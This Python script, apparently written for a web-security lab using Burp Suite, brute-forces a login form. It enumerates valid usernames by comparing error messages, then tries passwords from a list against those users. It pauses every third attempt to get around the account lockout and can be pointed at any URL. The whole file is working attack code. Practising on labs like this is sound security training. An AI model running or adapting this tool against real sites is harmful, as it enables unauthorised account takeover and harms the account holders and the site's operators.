import sys
import requests
import urllib3
import pandas as pd
from time import sleep

# Suppress the insecure requests warning
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Add proxy for troubleshoot, for urllib3 all proxies should use http
# Uses the Burp proxy -> Make sure Burp is running
proxies = {
    'http':'http://127.0.0.1:8080',
    'https':'http://127.0.0.1:8080'
}

# Update IP as needed to avoid lockout - for larger lists would need to alter more
# Functional but needs optimization
# Need to investigate the web app to determine number of attempts before lockout
# Enumerate username by looking for response other than what is given with unlikely username
def username_enum(url):
    usernames = []
    valid_users = []
    data = pd.read_csv('./burp_users.csv')
    for user in data:
        usernames.append(user)
        #print(user)
        #print(usernames)
    
    # Unlikely passwords to test for account lockout - if able to create account and verify password requirements can use invalid passwords to enumerate
    bad_passwords = ['password', 'admin','ringo','123456','12345','user','date','bad','qwerty','season']
    for user in usernames:
        for pw in bad_passwords:
            data = {
                "username": user,
                "password": pw
            }
            r = requests.post(url, data = data, verify=False, proxies=proxies)
            if 'Invalid username or password.' not in r.text:
                if user not in valid_users:
                    print(f'[+] {user} possibly valid')
                    valid_users.append(user)
    
    return valid_users       

def password_enum(url, valid_users):
    password_list = []
    users = valid_users
    data = pd.read_csv('./burp_pass.csv')
    for passw in data:
        password_list.append(passw)
        #print(passw)
    
    pass_index = 0
    for user in users:
        for pw in password_list:
            if pass_index % 3 != 0:
                data = {
                    "username": user,
                    "password": pw
                }
                r = requests.post(url, data = data, verify=False, proxies=proxies)
                
                if 'Invalid username or password.' not in r.text and 'too many' not in r.text:
                    print(f'***** {pw} possibly valid for {user} *****')
                    print(r.text)
            
            else:
                print("[-] Pausing for about a minute to allow lockout to expire.")
                sleep(75)
                print("[+] Back to work.")
                data = {
                    "username": user,
                    "password": pw
                }
                r = requests.post(url, data = data, verify=False, proxies=proxies)
                if 'Invalid username or password.' not in r.text and 'too many' not in r.text:
                    print(f'***** {pw} possibly valid for {user} *****')
                    print(r.text)
            pass_index += 1
                
        

if __name__ == "__main__":
    try:
        #valid_usernames = []
        url = sys.argv[1].strip()
        #valid_usernames = valid_usernames.append(sys.argv[2].strip())
    except IndexError:
        print(f'[-] Usage: {sys.argv[0]} <url>')
        print(f'[-] Example: {sys.argv[0]} www.example.com')
        sys.exit(-1)
    
    print('[-] Performing user enumeration')
    valid_usernames = username_enum(url)
    print(valid_usernames)
    print('[-] Performing password enumeration')
    valid_passwords = password_enum(url, valid_usernames)

